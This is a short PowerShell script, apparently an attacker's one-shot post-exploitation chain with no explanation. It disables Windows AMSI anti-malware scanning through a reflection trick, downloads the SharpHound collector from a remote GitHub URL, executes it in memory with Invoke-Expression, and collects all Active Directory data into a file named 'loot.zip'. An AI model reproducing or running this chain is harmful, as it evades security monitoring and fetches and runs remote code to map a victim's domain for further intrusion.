$Flags = [System.Reflection.BindingFlags] "NonPublic,Static"
$AmsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$Field = $AmsiUtils.GetField("amsiInitFailed", $Flags)
$Field.SetValue($null, $true)
$sh = Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing
Invoke-Expression $sh.Content
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
